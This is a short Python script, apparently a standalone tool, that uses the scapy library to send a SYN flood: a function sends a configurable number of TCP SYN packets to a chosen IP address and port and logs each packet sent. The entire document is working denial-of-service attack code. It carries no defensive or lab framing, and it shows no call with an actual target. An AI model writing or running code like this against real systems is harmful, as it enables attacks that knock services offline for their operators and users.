from scapy.all import IP, TCP, send
import os
import time

# Ensure the 'logs' directory exists
os.makedirs("logs", exist_ok=True)

# Function to log events to a file and print to console
def log_event(message):
    with open("logs/syn_flood_log.txt", "a") as log_file:
        log_file.write(f"{message}\n")
    print(message)

# Function to perform a SYN flood attack
def syn_flood(target_ip, target_port, packet_count=100):
    log_event(f"Starting SYN flood on {target_ip}:{target_port} at {time.strftime('%Y-%m-%d %H:%M:%S')}...")
    for i in range(packet_count):
        packet = IP(dst=target_ip) / TCP(sport=12345 + i, dport=target_port, flags="S")
        send(packet, verbose=False)
        log_event(f"Packet sent during SYN flood attack: {packet.summary()}")
    log_event(f"SYN flood completed at {time.strftime('%Y-%m-%d %H:%M:%S')}.")
